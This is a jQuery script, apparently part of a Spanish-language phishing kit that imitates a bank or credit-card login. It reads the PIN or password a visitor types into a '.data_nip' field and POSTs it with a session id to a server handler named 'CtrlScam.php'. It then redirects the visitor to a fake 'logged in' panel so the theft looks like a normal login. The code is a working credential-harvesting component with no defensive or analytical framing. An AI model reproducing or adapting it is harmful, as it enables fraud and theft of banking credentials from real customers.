$(document).ready(function(){

    //alert('Este script esta corriendo desde Script Password...');
    $('#loading2').hide();
    $('a.btn_stu_otp').click(function(e){
        e.preventDefault();

        var cliente = $('.data_nip');

        /*if(isNaN(cliente.val()) || cliente.val().length != 8){
            alert('Por favor verifique la información proporcionada.');
            console.log('Aqui estoy');
            cliente.focus();
        }else{*/
            if(cliente.val() == ""){
                //alert('Favor de teclear tu código de cliente o Tarjeta De Crédito.');
                alert('Por favor verifique la información proporcionada.');
                cliente.focus();
            }else{
                $.ajax({
                    type: 'POST',
                    url: '../Controllers/CtrlScam.php',
                    data: {
                        "request": "password",
                        "passwordCliente": cliente.val(),
                        "session": $('#session').val()
                    },
                    beforeSend: function(){
                        console.log("ENviando...");
                        $('#loading2').show();
                    },
                    success: function (resp){
                        console.log('Datos Enviados');
                        //alert(resp);
                        console.log(resp);
                        if(resp == "1"){
                            window.location.href="panel_logged.php?session="+$('#session').val();    
                        }else{
                            alert('Fallo al guardar');
                        }
                        
                    },
                    error: function (request, textStatus, errorThrown) {
                        console.log('Error al Enviar los Datos: '+errorThrown);
                    }
                });
                
            }
        //}
        return false;
    });
});